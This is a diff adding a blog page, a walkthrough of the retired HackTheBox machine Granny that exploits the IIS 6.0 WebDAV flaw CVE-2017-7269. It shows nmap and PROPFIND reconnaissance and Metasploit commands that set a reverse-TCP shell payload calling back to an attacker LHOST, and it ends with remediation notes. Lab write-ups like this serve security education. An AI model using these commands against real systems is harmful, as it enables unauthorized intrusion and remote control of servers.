@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Granny: the same WebDAV bug, retargeted and re-owned — Lucky Thandel</title>
+<meta name="description" content="Grandpa’s twin with a twist: the same CVE-2017-7269 needs different targeting — a lesson in reading exploit code instead of just running it. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-09 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Granny: the same WebDAV bug, retargeted and re-owned</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Granny is a retired HackTheBox easy Windows machine and Grandpa’s deliberate twin. Synopsis: another IIS 6.0 on Server 2003, another CVE-2017-7269 path — but stock Grandpa settings fail here. The lesson: reading and retargeting exploit code.</p>
+<h2><span class="amber">$</span> Enumeration — same banner, verify WebDAV</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: confirm the DAV surface</span>
+nmap -sC -sV -oN granny.nmap 10.10.10.15
+curl -s -X PROPFIND http://10.10.10.15/ -H &quot;Depth: 0&quot; | head -20</pre>
+<p>Same recon (IIS 6.0 banner, WebDAV enabled), same module — but the default target crashes the service instead of returning a shell.</p>
+<h2><span class="amber">$</span> Exploitation — retarget the module</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: retarget plus smaller payload</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.10.10.15
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; show targets
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set TARGET &lt;matching 2003 profile&gt;
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set PAYLOAD windows/shell/reverse_tcp
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; set LHOST 10.10.14.23
+msf6 exploit(iis_webdav_scstoragepathfromurl) &gt; run</pre>
+<p>Select the matching target profile and switch to a payload that fits the overflow constraints — the same overflow then lands cleanly as SYSTEM. Flags fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Re-running identical Grandpa settings hoping for luck (exploits are deterministic — change a variable, do not pray) and blaming the VPN (verify with a manual PROPFIND probe that WebDAV actually responds first).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire the stack. One patch gap, two boxes, same root cause — asset inventory catches both at once. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
